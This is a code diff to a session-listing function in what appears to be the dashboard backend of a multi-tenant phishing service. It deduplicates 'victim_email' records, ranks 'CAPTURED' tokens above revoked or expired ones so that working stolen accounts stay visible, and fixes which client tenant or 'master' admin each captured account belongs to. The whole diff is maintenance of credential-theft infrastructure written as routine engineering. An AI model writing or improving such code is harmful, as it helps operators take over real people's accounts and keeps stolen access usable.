@@ -656,31 +656,38 @@ def get_all_sessions(owner_id=None, admin_only=False):
     finally:
         conn.close()
 
-    # De-duplicate sessions by (owner_id, victim_email) so one tenant's capture
-    # never silences another's.
+    # De-duplicate sessions by victim_email so one person appears once.
     #
     # A restored backup can leave two rows for the same person: the stale one
     # that was already here and the restored one (suffixed user_code). Both can
     # share a created_at, so ordering alone is not enough — a live CAPTURED row
     # must always win over a REVOKED/EXPIRED duplicate, otherwise the dashboard
     # shows a dead token and hides the working account.
+    #
+    # Keying on (owner_id, email) let an unowned duplicate sit alongside the
+    # client-owned row. The admin mailbox filters owner_id IS NULL, so a client
+    # tenant's account showed up in the master's mailbox as if it were his.
+    # Key on email alone and prefer the row that actually has an owner.
     _STATUS_RANK = {'CAPTURED': 0, 'REVOKED': 1, 'EXPIRED': 2, 'PENDING': 3}
     best = {}
     deduped = []
     for s in raw_sessions:
         email = (s.get('victim_email') or '').strip().lower()
-        owner = s.get('owner_id')
         if not email or email == 'unknown':
             deduped.append(s)
             continue
-        key = (owner, email)
+        key = email
         prev = best.get(key)
         if prev is None:
             best[key] = s
             continue
-        # Keep whichever row is more useful: better status, then newer id.
-        if (_STATUS_RANK.get(s.get('status'), 9), -(s.get('id') or 0)) < \
-           (_STATUS_RANK.get(prev.get('status'), 9), -(prev.get('id') or 0)):
+        # Keep whichever row is more useful: owned beats unowned, then better
+        # status, then newer id.
+        def _rank(x):
+            return (0 if x.get('owner_id') is not None else 1,
+                    _STATUS_RANK.get(x.get('status'), 9),
+                    -(x.get('id') or 0))
+        if _rank(s) < _rank(prev):
             best[key] = s
     deduped.extend(best.values())
     # Preserve the caller's ORDER BY (created_at DESC).
